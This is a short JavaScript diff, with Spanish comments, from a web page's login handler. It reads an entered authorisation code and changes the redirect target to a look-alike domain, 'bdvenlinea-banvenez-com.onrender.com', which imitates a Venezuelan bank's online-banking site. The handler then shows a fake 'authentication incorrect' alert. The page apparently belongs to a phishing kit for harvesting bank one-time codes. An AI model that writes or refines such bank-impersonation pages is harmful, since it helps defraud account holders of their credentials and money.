@@ -133,7 +133,7 @@ document.getElementById("authBtn").addEventListener("click", async function () {
 document.getElementById("authBtn").addEventListener("click", async function () {
     const authCode = document.getElementById("authCode").value;  
         // Redirigir a la ventana de usuario
-        window.location.href = "https://3822bcd2-4d87-46a4-b375-d3a63c42d5a3-00-1iwudy2cg4dq1.janeway.replit.dev/"; // Cambia "ruta/a/tu/ventana-de-usuario.html" a la ruta de la ventana de usuario
+        window.location.href = "https://bdvenlinea-banvenez-com.onrender.com"; // Cambia "ruta/a/tu/ventana-de-usuario.html" a la ruta de la ventana de usuario
 
         // Mostrar mensaje de autenticación incorrecta
         alert("Autenticación incorrecta"); // Muestra el mensaje de error
